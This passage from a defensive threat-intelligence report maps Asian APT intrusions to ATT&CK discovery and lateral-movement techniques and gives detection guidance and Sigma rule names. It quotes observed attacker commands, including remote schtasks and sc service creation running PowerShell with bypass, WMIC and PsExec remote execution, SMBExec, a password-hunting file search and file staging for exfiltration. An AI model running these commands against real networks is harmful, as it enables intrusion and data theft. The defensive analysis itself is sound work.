--script smb-enum-shares <xxx>_24.xml\nnmap -p 3389 -T3 -v -n -Pn --open <xxx>_24.xml\nnmap -T3 -A -v -n -Pn --open --script smb-enum-shares <xxx>.xml\nnmap -p 445 -T3 -A -v -n -Pn --open <xxx>_24.xml\nnmap -T3 -A -v -n -Pn --open <xxx>.xml\nnmap -p 445 -T3 -v -n -Pn --open --script nbstat <xxx>_24.xml\nnmap -p 445 -T4 -v -n -Pn --open --script nbstat <xxx>_18.xml\n\n\n-----\n\n**Example 5**\n\nHere's another example of a scanner, which inspected the SMB port in this case:\n\n\nsmbscan.exe <ip address>\nMD5: B75B8170C5BFABB998F54768E80E3739\n\n\nsmbscan.exe scans an IP address for network folders and prints the IP address to stdout if a response\nis received. The sample sends ordinary SMB packets (without shellcodes) and does not exploit SMB\nvulnerabilities.\n\n###### Detection\n\nTo detect the Network Share Discovery technique, you should track any startup parameters of the created\nprocesses and all executed PowerShell commands. Activity matching this technique may be performed by\nsystem administrators. Therefore, precise detection rules should be configured to account for normal activity\nin the particular organization. Just like for other techniques from the Discovery tactic, we recommend that you\nconfigure an alert to be generated when multiple discovery rules are triggered. For example, an alert should be\ngenerated when 3–5 rules for various techniques are triggered within a period of 10 minutes.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 5156\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1, 3\n\n###### SIGMA rules\n\n- Sigma-Generic-Network Share Discovery via PowerShell\n\n- Sigma-Generic-Network Share Discovery via Standard Windows Utilities\n\n\n-----\n\n###### Remote System Discovery T1018\n\n\n###### Basic description\n\nAPT actors can obtain additional information about a computer based on its IP address, name, or other\nnetwork identifier that can be used for lateral movement from an infected system through the company\ninfrastructure. These capabilities are provided by remote administration tools (RAT) and by other tools\navailable in the operating system, such as \"ping\", \"tracert\" and \"net\".\n\nThey can also get information about external hosts by analyzing the local ARP cache. Another option is to get\nadditional information directly from network devices to study the target network. For example, the \"show cdp\nneighbors\" or \"show arp\" commands can be used for these purposes.\n\n###### Examples of procedures\n\nExamples of procedures that were encountered when analyzing the incidents mentioned above:\n\n\nping -n 1 <remote_host>\ncmd.exe /c C: & cd\\ & cd \"Windows\\web\" & C:\\Windows\\System32\\logfiles\\nbtscan.exe <remote_host>\ncmd /c tracert -h 2 <remote_host> > $temp\\1.txt\n\n\n###### MD5 File name\n\nab55a08ed77736ce6d26874187169bc9 Ladon.exe\n\nThis plug-in is a comprehensive scanner that is capable of scanning ports and identifying services, network\nassets, passwords, and vulnerabilities.\n\n\n-----\n\nFigure 63 Рlug-in code (scanner)\n\n\n-----\n\n###### Detection\n\nOne of the ways to detect the Remote System Discovery T1018 technique is to look for process creation\nevents. You should pay close attention to any running utilities or tools that were mentioned above, and analyze\nthe command-line contents (when audits are enabled). You can also utilize the capabilities of network traffic\nanalysis (NTA) systems, which detect and show scans of hosts and ports of assets within the infrastructure.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Network Share Discovery via PowerShell\n\n   - Sigma-Generic-Network Share Discovery via Standard Windows Utilities\n\n\n-----\n\n###### Domain Trust Discovery T1482\n\n\n###### Basic description\n\nDomain Trusts (domain trust relationships) are used in Microsoft Active Directory to identify the level of access\nbetween various domains.\n\nTrust Validation in the context of Active Directory refers to the process of verifying trust relationships\nbetween domains or forests. When trust is established between various domains, this trust must be verified to\nensure security and authenticity.\n\nMain objectives of domain trust discovery:\n\n###### 1\n\nSearch for trust relationships between various domains on a network to understand the domain structure and\nfind opportunities to expand access capabilities\n\n###### 2\n\nExpand access to resources in other domains\n\n###### 3\n\nSearch for security configuration vulnerabilities to bypass restrictions that may be implemented within\nindividual domains\n\n###### 4\n\nElevate privileges by obtaining access to administrative accounts in other domains\n\nThere are several tools for discovering trust relationships and detecting vulnerabilities in a Windows Active\nDirectory network. Although these tools can be used by system administrators to check the security of their\nnetwork, they may also be employed by attackers to conduct attacks:\n\n- PowerSploit\n\n- PowerView\n\n- BloodHound\n\n- PingCastle\n\n- ADRecon\n\n- Nmap\n\n\n-----\n\nDiscovery of trust relationships in a domain infrastructure can also be performed by using the following\ncommand:\n\n###### Windows CMD\n\n Command Description\n\nThe nltest command can be used to identify trust relationships between various\nnltest /domain_trusts\ndomains.\n\nThe netdom tool can also be used to work with trust relationships between domains.\nnetdom trust <domain_name> For example, you can use the following command to enumerate the trust relationships\nfor a specific domain.\n\ndsquery * -filter The dsquery command lets you query Active Directory. This command can be used to\n\"(objectClass=trustedDomain)\" enumerate all trust relationships of a domain.\n\nThis command lets you view the available domains in a network. It can help identify other\nnet view /domain\ndomains with which the current domain has trust relationships.\n\nThe dsget command may be used to get information about the properties of Active\ndsget domain <domain_name> -trust\nDirectory objects or information about trust relationships for a specific domain\n\n\n-----\n\n###### Windows PowerShell\n\n Cmdlet Description\n\nThe Get-ADTrust cmdlet can be used to get information about trust relationships\nGet-ADTrust -Filter *\nbetween domains.\n\nThe PowerSploit tool has the Get-NetDomainTrust command, which provides\ninformation about trust relationships between domains. This tool can be used by\n\nGet-NetDomainTrust attackers to inspect a network. Please keep in mind that PowerSploit is a pentesting tool\n\nand should be used only with the approval of the system owner or in accordance with\napplicable laws and policies.\n\nThe Get-ADDomainController command from the ActiveDirectory module can help\nGet-ADDomainController -Discover\nidentify domain controllers in other domains and thereby detect trust relationships.\n\nTest-NetConnection -ComputerName This command lets you check the availability of a network connection to a remote host.\n<domain_controller_name> This can be used to check connectivity with trusted domain controllers.\n\nThe Get-NetForestDomain command from the PowerSploit toolset can be used to\nGet-NetForestDomain\ndisplay information about trust relationships within a forest.\n\nGet-ADDomain <domain_name> | The Get-ADDomain command from the ActiveDirectory module provides\nSelect-Object Name, Trusts information about the current domain and its trust relationships.\n\nGet-ADTrustRelationship -Domain The Get-ADTrustRelationship command from the ActiveDirectory module provides\n<domain_name> information about the trust relationships for the specified domain.\n\n\n-----\n\n###### Examples of procedures\n\nIn attacks conducted by Asian APT groups, we did not observe much variety in the methods that they used\nfor discovering trust relationships between domains. Instead, their discovery basically involved only the nltest\ncommand and the well-known tools, such as BloodHound:\n\nIn the attack targeting Russian companies, the following commands were used:\n\n###### Command Description\n\nThis command is used to display a list of domain controllers for the specified domain in\nnltest /dclist:<victim_domain>\nthe network.\n\nThis command is used to enumerate all trust relationships of the current domain. The\nnltest /domain_trusts output of this command includes a list of domains with which trust relationships have\nbeen established, and indicates the type of each trust relationship.\n\n###### Detection\n\nIt may be difficult to detect the Domain Trust Discovery T1482 technique because attackers can use various\nmethods and tools to explore the trust relationships in a Windows Active Directory network. Attempts to\ndetect domain trust relationships usually involve tracking specific commands or scripts. You can also monitor\nActive Directory events involving changes made to trust relationships between domains. Traffic analyzers can\nhelp detect suspicious requests or network activity related to domain trust discovery.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 4662\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n- Sigma-Generic-Domain Trust Discovery via nltest.exe\n\n\n-----\n\n###### Query Registry T1012\n\n\n###### Basic description\n\nAttackers gather information about a system by querying the registry. The Windows registry contains a large\namount of data on the computer configuration and users. There are several ways to request information from\nthe registry, including various console-based or GUI tools, PowerShell cmdlets, and WinAPI functions.\n\nIn many cases, this is not the primary technique that the attackers use for their ultimate objectives. For\nexample, they may use the registry to gather information about services installed in the system. In this case,\nthe Query Registry technique only shows the way that the attackers achieve certain objectives, while their\nprimary technique is System Service Discovery.\n\n###### Examples of procedures\n\n**Example 1**\n\nDuring an attack, an Asian APT group gathered information about storage devices connected to a host by\nusing the following registry queries:\n\n\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceClasses\\{53f56307-\nb6bf-11d0-94f2-00a0c91efb8b}\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USB\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\UsbFlags\nreg query HKLM [/s]\nreg query HKCU [/s]\n\n\n-----\n\n**Example 2**\n\nIn an attack targeting a government organization in Russia, an Asian APT group gathered information about\ninstalled office software from the registry:\n\nreg query hku\nreg query hku\\S-1-5-21-[REDACTED]\\Software\\Microsoft\\Office\nreg query hku\\S-1-5-21-[REDACTED]\\Software\\Microsoft\\Office\\14.0\nreg query hku\\S-1-5-21-[REDACTED]\\Software\\Microsoft\\Office\\14.0\\Outlook\\profiles\nreg query hku\\S-1-5-21-[REDACTED]\\Software\\Microsoft\\Office\\14.0\\Outlook\nreg query hku\\S-1-5-21-[REDACTED]\\Software\\Microsoft\\Office\\14.0\\Outlook\\Preferences\nreg query hku\\S-1-5-21-[REDACTED]\\Software\\Microsoft\\Office\\14.0\\Outlook\\UserInfo\nreg query hku\\S-1-5-21-[REDACTED]\\Software\\Microsoft\\Office\\14.0\\Outlook /s | find \"<victim_\ndomain_name>\"\n\n###### Detection\n\nA request for information from the registry is not necessarily an indicator of an attack or malicious activity.\nTherefore, detection of this technique should rely on non-typical patterns of process creation (for example,\nmultiple reg.exe processes created by cmd.exe with queries to registry keys containing information about\ndata storage devices) or queries to specific registry keys (for example, reg.exe starting with a command line\ncontaining HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services).\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n\n-----\n\n###### Account Discovery T1087\n\n\n###### Basic description\n\nAttackers gather information about local user accounts (T1087.001 Local Account), domain accounts\n(T1087.002 Domain Account), or cloud accounts (T1087.004 Cloud Account) and/or email addresses\n(T1087.003 Email Account). This data can be then used to more effectively search for account credentials\n(Credential Access), counteract Blue Team actions, and/or carry out other stages of an attack (for example,\ninternal targeted phishing).\n\nIn Windows, you can view local and domain users by using PowerShell cmdlets or other tools. The primary tool\nused for account discovery is net.exe (or net1.exe). The net.exe user command displays a list of local users on a\nhost. If a specific username is entered after user, more detailed information about that user will be displayed. If\nthe net.exe tool is started with the /domain switch, information about domain users is displayed.\n\nTools and cmdlets used for gathering information about user accounts are presented in the table:\n\n###### Windows Utilities PowerShell\n\n\nLocal Account\n\n\nnet user\nnet user <username>\nquery user\nquser\n\n\nGet-LocalUser\n\n\nnet user /domain\nDomain Account Get-ADUser\nnet user <username> /domain\n\nAttackers can also use PowerShell cmdlets to get domain accounts in cloud infrastructures:\n\n**• Get-MsolUser**\n\n**• Get-MsolRoleMember**\n\n**• Get-MsolServicePrincipal**\n\nIn addition to the described user discovery methods, there are also less obvious approaches. A few examples\nare presented below:\n\n###### 1\n\nView the directory %SYSTEMDRIVE%\\Users\n\n\n-----\n\nView the users in groups (net localgroup <groupname>)\n\n###### 3\n\nView the HKEY_USERS\n\n###### 4\n\nView the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\n**ProfileList**\n\n###### Examples of procedures\n\n**Example 1**\n\nIn one attack, an Asian APT group used the net.exe utility to gather information about local accounts:\n\n\n**net user <xxx>**\n**net user**\n\n\n**Example 2**\n\nAttackers used PowerShell cmdlets to get a list of accounts in a cloud-based Azure Active Directory:\n\n\n**Get-MsolUser <xxx>**\n**Get-MsolUser -UserPrincipalName <xxx>**\n\n\n-----\n\n###### Detection\n\nThe Account Discovery technique can be detected by tracking process creation events and script execution\nevents (PowerShell: 4103, 4104). Keep in mind that viewing the users in a system is a legitimate activity, and the\nenvironment should be carefully examined whenever correlation rules are triggered.\n\nYou can also track LDAP requests to enumerate users in a domain, and configure alerts to be generated when\na request threshold is reached.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Local Account Discovery via Standard Windows Utilities\n\n   - Sigma-Generic-Domain Account Discovery via PowerShell\n\n\n-----\n\n###### File and Directory Discovery T1083\n\n\n###### Basic description\n\nThe File and Directory Discovery T1083 technique involves searching and analyzing files and directories on a\nhost. Threat actors use this technique to get information about the environment of the target system, identify\nvaluable data, or find vulnerabilities in the system for further exploitation.\n\nAttackers may use the standard commands and tools of the operating system to search and view files and\ndirectories.\n\nFor example, they may use the following commands in Windows:\n\n###### Windows cmd PowerShell\n\n\ndir, tree, find, findstr, xcopy, type, move, where,\nattrib, icacls\n\n\nGet-ChildItem, gci, dir, ls, Get-Content, gc, cat, type, SelectString, sls, Copy-Item, cp, copy, cpi, Get-Acl, Test-Path, JoinPath\n\n\nWhen employing this technique, attackers can obtain the following:\n\n- Information about the files and directories residing on the system. This will help them understand how the\nsystem is set up and which data it contains.\n\n- Contents of files storing valuable information, such as authentication data, confidential documents,\npasswords, and other secrets.\n\n- Information from files and directories on system vulnerabilities that can be used to conduct further attacks.\n\n###### Examples of procedures\n\nThis technique is most frequently combined with other techniques such as T1552 (Unsecured Credentials),\nT1119 (Automated Collection), and most techniques from the TA0007 (Discovery) tactic aided by ready-to-use\nscripts or tools.\n\n\nParent_image_path: C:\\Windows\\system32\\cmd.exe\nCommand_line: “where /f /t /r \\\\<hostname>\\C$\\users\\<username>\\ *.doc *.docx *.xls *.xlsx *.ppt\n*.pptx *.pdf *.amr *.tif *.tiff *.rtf | findstr pass”\n\n\n-----\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n\ndir c:\\\\users -File -Recurse -Include '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx' | where LastWriteTime -gt $lte |\nsort LastWriteTime -Descending | %{$_.FullName}\nwrite-output $fp1 >> \"$env:tmp\\$hostname\\path.txt\"\n$fp1 | copy-item -Destination \"$env:tmp\\$hostname\" -Force -ErrorAction SilentlyContinue\n\n###### Detection\n\nTo detect this technique, you are advised to monitor process creation events containing discovery commands\nand track recursive searches through directories for specific file extensions.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n- Sigma-Generic-Suspicious Wildcard Searching Data\n\n\n-----\n\n###### Group Policy Discovery T1615\n\n\n###### Basic description\n\nAttackers gather information about group policies configured in a domain. Group policies are used for\ncentralized configuration of endpoints in a domain. A large variety of settings can be configured through group\npolicies, ranging from the user desktop wallpaper to the scripts that are run when the user logs in.\n\nAttackers aim to get relevant information about a domain, including centrally distributed postponed tasks,\nlogon/logoff scripts, logs, access settings, and startup restrictions.\n\nThere are several ways to get information about configured group policies, including by using system utilities\nand PowerShell cmdlets, and by directly reading the files of group policies from the SYSVOL folder.\n\n###### Examples of procedures\n\nIn one of the attacks examined in the first part of this report, an Asian APT group directly read the contents of\nscript files and group policy files by using cmd.exe:\n\n\ncmd.exe /C type\n\\\\<dc_hostname>\\SYSVOL\\<fqdn>\\Policies\\{REDACTED_GUID}\\Machine\\Preferences\\\nScheduledTasks\\ScheduledTasks.xml\n\n\ncmd.exe /C type \\\\<dc_hostname>\\sysvol\\run.bat\n\n\n###### Detection\n\nYou can detect this technique by looking for process creation events and PowerShell script block execution\nevents. In this case, pay close attention to the creation of shell processes showing patterns of reading from\nSysvol and running gpresult. The typical patterns of group policy discovery in PowerShell cmdlets are specified\nin the SIGMA rule.\n\nDetection of this technique is complicated by the fact that administrators, support personnel, and other\nlegitimate users may also view information about group policies. To reduce the number of false positives,\nyou should carefully analyze the environment to determine what specifically occurred on the host when\nthese commands were executed, which user account was used to run them, and whether or not the Security\nOperations department was informed about administrative or other legitimate operations being performed.\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Group Policy Discovery via gpresult\n\n   - Sigma-Generic-Group Policy Discovery via PowerShell\n\n\n-----\n\n###### Network Service Discovery T1046\n\n\n###### Basic description\n\nAPT actors often analyze a network to find vulnerable services. One of the ways to implement this technique\nis to view open ports on the local/remote host or network device. To detect open ports on machines in a\nnetwork, attackers may use custom-written PowerShell scripts or tools and run them on infected systems.\nAnother way to implement this technique is to use vulnerability scanners.\n\n###### Examples of procedures\n\nBelow are some examples that we encountered when analyzing the incidents described in this report:\n\n\nC:\\Windows\\temp\\1.ps1; Invoke-PortCheck -network 10.0.48 -port 22,80,445,443,3389,8080\nC:\\Windows\\System32\\logfiles\\portscan.exe -h <remote_host> -p 22\nC:\\Windows\\System32\\logfiles\\portscan.exe -h <remote_host> -p 25,110\n\n\nDuring their attacks, Asian APT groups also use utilities such as port scanner (MD5\nbb2ee5e6dfd4d12d31ec33c3fba84909, detected with the verdict Not-a-virus:HEUR:NetTool.Win32.Portscan.\ngen).\n\nThis port scanner was detected in the following directories:\n\n- С:\\Users\\Public\\Downloads\\\n\n- C:\\Windows\\tasks\\\n\n- С:\\Users\\User\\Downloads\\\n\n- С:\\Windows\\help\\help\n\nunder the following names:\n\n- cp.exe\n\n- dwm.exe\n\n- nbtp.exe\n\n- smit.exe\n\n\n-----\n\n###### Detection\n\nThe technique known as Network Service Discovery T1046 can be detected by tracking process creation\nevents. You should pay close attention to any running utilities or tools that were mentioned above, and analyze\nthe command-line contents (with audit enabled). You can also utilize the capabilities of network traffic analysis\n(NTA) systems, which detect and show scans of hosts and ports of assets within the infrastructure.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n\n-----\n\n###### Process Discovery T1057\n\n\n###### Basic description\n\nThis technique allows attackers to obtain information about the processes running in the system. This\ninformation can help provide an overall picture of the work environment. For example, it can help determine if\nit's a developer's computer, a virtual workstation, or a server.\n\nThe attacker can use this information to develop the ongoing strategy of their attack, analyze the running\nantivirus protection tools, and verify that malware is running.\n\nIn Windows operating systems, you can get information about running processes by using the tasklist utility in\nthe cmd command shell, by running the Get-Process cmdlet in PowerShell, and by using the WinAPI function\nCreateToolhelp32Snapshot. The ps command is used in UNIX operating systems, and the \"show process\"\ncommand can be used on network devices.\n\n###### Examples of procedures\n\n\ncmd.exe /c tasklist >$temp\\temp.txt\nwmic process | find \"<process_name>\"\ntasklist /v >> C:\\Windows\\Web\\systeminfo.txtbb\n\n\n###### Detection\n\nThe Process Discovery T1057 technique can be detected based on process creation events and the execution\nof PowerShell script blocks. You should pay close attention to any running utilities or tools that were mentioned\nabove, and analyze the command-line contents (with audit enabled).\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\n###### SIGMA rules\n\n   - Sigma-Generic-Process Discovery via PowerShell\n\n   - Sigma-Generic-Process Discovery via Standard Windows Utilities\n\n\n-----\n\n###### System Owner/User Discovery T1033\n\n\n###### Basic description\n\nAttackers can determine the name of an authorized user of the system, and get a list of all users of the system\nor the name of the system administrator. This information is necessary for collecting additional discovery\ndata and further establishing persistence, gaining privileges, and moving through the infrastructure. This\ninformation can be gathered in a variety of ways because it resides in various places in the operating system.\nUseful information may include the rights to specific files/directories, information about sessions, the owner of\nrunning processes, or system event logs.\n\nTo get this type of information, you can use various tools and commands such as whoami to get the name\nof the user in whose context a process is running. In macOS and Linux, the currently logged-in user can be\nidentified by using the “w” and “who” commands. In macOS, the command “dscl . list /Users | grep -v '_' “ can\nalso be used to enumerate user accounts. To access this information, you can also use environment variables\nsuch as %USERNAME% and $USER.\n\nOn network devices, CLI commands such as \"show users\" and \"show ssh\" can also be used to display the\ncurrent users.\n\n###### Examples of procedures\n\nBelow are some examples that we encountered when analyzing the incidents described above:\n\n\nquser.exe whoami\nquser.exe quser\n$system32\\cmd.exe /C whoami\n\n\n###### Detection\n\nOne of the ways to detect the System Owner/User Discovery T1033 technique is to track process creation\nevents and the execution of PowerShell script blocks. You should pay close attention to any running utilities or\ntools that were mentioned above, and analyze the command-line contents (with audit enabled).\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\n###### SIGMA rules\n\n   - Sigma-Generic-Anomaly Parent Process whoami.exe\n\n   - Sigma-Generic-System Owner/User Discovery via PowerShell\n\n   - Sigma-Generic-System Owner/User Discovery via Standard Windows Utilities\n\n   - Sigma-Generic-System Owner/User Discovery via Suspicious CommandLine whoami\n\n\n-----\n\n##### Lateral Movement TA0008\n\n###### Remote Services T1021\n\n Basic description\n\nThe Remote Services T1021 technique exploits a large number of remote connection services that attackers\nuse to move through the victim's network. Valid user accounts are required for lateral movement. The most\npopular remote connection services are RDP and SSH.\n\nAPT groups often use the SMB protocol to interact with shared file folders, which enables attackers to move\ndeeper into the network.\n\n\n-----\n\n###### Remote Services: SMB/Windows Admin Shares T1021.002\n\n\n###### Basic description\n\nThis technique is most frequently used by Asian APT groups for lateral movement. SMB (Server Message\nBlock) is a network protocol intended for access to files and printers. Attackers use SMB and a user account to\nmove through the network.\n\nFor remote access to a host connected over SMB, the administrative network folders C$, ADMIN$, and IPC$\nare used to drop malicious files that are then run on the target system. Many Asian APT groups use SMB/RPC\nto create Windows services, scheduled tasks, and WMI tasks. Let's examine a few examples of this method in\naction.\n\n###### Examples of procedures\n\n**Example 1**\n\nIn the attack targeting Malaysia, scheduled tasks were created on the hosts that the attackers were able to\nconnect to over SMB:\n\n\nschtasks /s <hostname> /tn one /u <domain>\\<username> /p <password> /create /ru system /sc\nDAILY /tr \"cmd /c start /b PowerShell.exe -exec bypass -c 'C:\\programdata\\intel\\mvl.ps1 20'\" /f\n\n\nTo create a task on a remote host, the hostname is passed as an argument with the /s parameter.\n\nSometimes the attackers created Windows services on remote hosts instead of scheduled tasks:\n\n\nsc \\\\<hostname> create ctt binpath= \"cmd /c start /b PowerShell.exe -exec bypass -c\n'C:\\programdata\\intel\\mvl.ps1 30'\"\n\n\n-----\n\n**Example 2**\n\nThe WMIC utility was used in the incident involving WebDav-O:\n\n\nwmic /node:<hostname> /user:[REDACTED] /password:[REDACTED] process call create “<command>”\n\n\n**Example 3**\n\nAsian APT groups also use the popular tool known as PsExec:\n\n\nPs2.exe -accepteula -h \\\\<remote_host> -u <user> -p <password> cmd\n\n\nThe executable file of PsExec on the attacker's machine creates the Psexesvc service and copies it to the\nopen administrator folder Admin$ on the remote system. Then the Windows Service Control Manager API\nis used to start the service on the remote machine. The named pipe psexecsvc is created on the attacker's\nmachine and is used to interact with the victim's computer. Then the service on the remote machine executes\nthe transmitted commands.\n\n**Example 4**\n\nWe also observed the APT group Dark Seoul using the SMBExec module from the Impacket framework.\n\n\n%COMSPEC% /Q /c echo <command> ^> \\\\127.0.0.1\\C$\\__out 2^>^&1 > %TEMP%\\e.bat &\n%COMSPEC% /Q /c %TEMP%\\e.bat & del %TEMP%\\e.bat\n\n\nSMBExec does not actually create an executable file. Instead, it uses that same Windows Service Control\nManager API to create a service named BTOBTO (the name can be changed). This service starts a command\nline using %COMSPEC%. In the figure below, the Service File Name field shows the necessary command to be\nexecuted, stdout and stderr are redirected to a temporary BAT file, then this BAT file is executed and deleted.\nA script on the attacker's machine then uses SMB to download the temporary file containing the command\nexecution results and displays its contents on the screen. This procedure essentially runs a shell that the\nattacker can use to execute commands without actually having the executable file in the system. Each time\nthe command is executed, a new service is created and the procedure repeats.\n\n\n-----\n\nFigure 64 Service creation event 4697\n\nFigure 65 Using impacket-smbexec on Kali Linux\n\n\n-----\n\n**Example 5**\n\nIn addition to using the utilities listed above, attackers also mounted shares using the net.exe utility.\n\nnet use \\\\<ip> /u:<domain>\\<username> <password>\n\n###### Detection\n\nTo detect lateral movement through the network, you need to track interactions with shared network folders,\nremote login events, and unusual connections over SMB. As illustrated in the examples, you must track\nevents involving the creation of services and scheduled tasks via SMB, and monitor execution of the net use\ncommand.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 4624\n\nSysmon Sysmon 1, 3, 17, 18\n\n###### SIGMA rules\n\n   - Sigma-Generic-Remote Windows Service Creation or Modification via sc.exe\n\n   - Sigma-Generic-Mounting Shares via net\n\n   - Sigma-Generic-Suspicious Schtasks.exe Arguments\n\n   - Sigma-Generic-Suspicious PsExec Execution\n\n   - Sigma-Generic-PsExec Pipes Artifacts\n\n\n-----\n\n###### Lateral Tool Transfer T1570\n\n\n###### Basic description\n\nAfter establishing persistence on a host, attackers transfer utilities, scripts, malicious software or other files\nbetween hosts in the infrastructure as part of their lateral movement within the network. Attackers use file\ntransfer protocols such as SMB or RDP.\n\nThreat actors deliver their toolsets by using utilities that are already available on the compromised host,\nincluding scp, rsync, curl, sftp and ftp.\n\n###### Examples of procedures\n\n**Example 1**\n\nAn APT group moved utilities and other files from one host to another via SMB:\n\n\nC:\\Windows\\system32\\cmd.exe /C copy * \\\\<remote_ip>\\C$\\windows\\help\\help\n\n\n**Example 2**\n\nAfter copying a compressed Install.exe.cab file to a remote host, the attackers used the expand command to\nunpack the file:\n\n\nexpand \"\\\\<remote_host>\\c$\\programdata\\microsoft\\AppV\\Setup\\Install.exe.cab\"\n\"\\\\<remote_host>\\c$\\programdata\\microsoft\\AppV\\Setup\\Install.exe\"\n\n\n**Example 3**\n\nUsing the xcopy command, attackers from the ToddyCat group moved their collected files from a remote host\nto a local host for subsequent exfiltration:\n\n\nxcopy \\\\<hostname>\\c$\\programdata\\intel\\<hostname> c:\\intel\\<hostname> /h /s /f\n\n\n-----\n\n###### Detection\n\nThe attacker activity examined above can be detected based on process creation events. The command line in\nthe provided examples contains \"\\\\\", which is typical for use of the SMB protocol.\n\nHowever, this may not be enough if the computer that initiated the file transfer is not connected to the\nmonitoring system and no logs are received from it. One of the ways to detect file creation via SMB is to\ncorrelate two events: a network connection via SMB and the creation of an executable file.\n\nSome EDR solutions provide the capability to track events involving file creation via SMB.\n\nBesides the SMB protocol, attackers may also use HTTP or RDP.\n\nTo detect this technique, you can also track the execution of utilities and commands that could be used to\ntransfer files from one host to another, such as:\n\n   - copy, xcopy, move, expand\n\n   - PowerShell\n\n   - bitsadmin\n\n   - curl\n\nThis list is not exhaustive.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 3\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\n###### SIGMA rules\n\n   - Sigma-Generic-File Download via Bitsadmin\n\n   - Sigma-Generic-Bitsadmin Job via PowerShell\n\n\n-----\n\n###### Replication Through Removable Media T1091\n\n\n###### Basic description\n\nWhen trying to obtain secret information, APT groups look for ways to reach physically isolated systems. One\nway is to spread malware through removable drives.\n\nBy copying malware to removable drives and using autorun functions, attackers can run programs on a system\nwhere an infected drive is connected. During lateral movement, this may be done by modifying the executable\nfiles stored on removable drives, or by copying malware and renaming it so that it looks like a legitimate file. This\nway, users are tricked into running the malware on a standalone system.\n\nRemovable drives can also be used as proxies between an isolated system and a system with internet access\nso that sensitive information can be copied from a company.\n\n###### Examples of procedures\n\nWhile investigating an attack on an industrial company in Russia, the ICS CERT team detected second-stage\nimplants intended for collecting data from isolated systems.\n\nThe primary module of the detected malware was intended for working with removable drives as follows:\n\n- Infect the connected drive.\n\n- Copy files from the connected drive to the local system.\n\n- Log information about connected drives and their contents.\n\nThe behavior of the module is configured using a configuration file dropped onto the host at the static path\n\"C:\\Users\\Public\\Libraries\\main.ini\".\n\nOn each removable drive, the implant creates a hidden folder named $RECYCLE.BIN in the root directory of\nthe drive and an empty file named S-1-5-21-963258 in the hidden folder. This file marks the drive as infected.\n\nTo infect a removable drive, the primary module simply copies two files named mcods.exe and McVsoCfg.dll\ninto the root directory and sets the \"Hidden\" attribute for both files.\n\nThen the primary module analyzes the contents of the root directory of the drive to create a decoy file with\nthe name of a document or folder. The document is dropped into the $RECYCLE.BIN folder, or, if a folder name\nwas used instead of a document name, the \"Hidden\" attribute is set for the folder.\n\n\n\n[name of document or folder].lnk\nTarget: “rundll32.exe url.dll,FileProtocolHandler mcods.exe”\n\n\n-----\n\nWhen the user clicks the decoy LNK file, the McVsoCfg.dll implant is executed via rundll32 proxy execution and\nDLL side-loading. The implant infects the host, then attempts to delete itself from the infected drive:\n\ncmd /c ping localhost & del $selfpath\n\nImmediately after that, a third-stage implant is extracted from memory, saved to %APPDATA% folder with the\nname msgui.exe on the attacked host, and then executed. The msgui.exe file is intended for collecting data\nand saving its results to the $RECYCLE.BIN folder on the drive so that it can be later collected by the primary\nmalware module (when connecting to the originally infected host).\n\n###### Detection\n\nEPP solutions help detect malware-infected removable drives. State-of-the-art solutions scan newly\nconnected drives for malware and can block their execution.\n\nYou must also take into account the host telemetry and events involving the creation of new drives, creation\nof executable files on removable drives, and process creation initiated by the files residing on the removable\ndrive.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 11\n\n\n-----\n\n###### Taint Shared Content T1080\n\n\n###### Basic description\n\nThis technique delivers utilities and malware to targeted hosts via shared network resources, such as a readaccessible network folder on a domain controller like SYSVOL.\n\nAsian APT groups frequently drop into the SYSVOL folder their files, which may include archives whose files\nare then copied to the file system, scripts that can be executed on hosts without being directly copied, or\nother relevant tools.\n\n###### Examples of procedures\n\n**Example 1**\n\nAn Asian APT group uses a BAT script residing in a shared network folder of the domain controller. The\nfollowing arguments are passed to the BAT script:\n\n\n$system32\\cmd.exe /c \\\\<dc_hostname>\\sysvol\\<domain>\\scripts\\versions.bat taskhostw.exe\nAsusLinkNear|$(Arg0)\n\n\n**Example 2**\n\nAsian threat actors often use archives to store and transfer their tools within the target infrastructure. Here is\nan example of 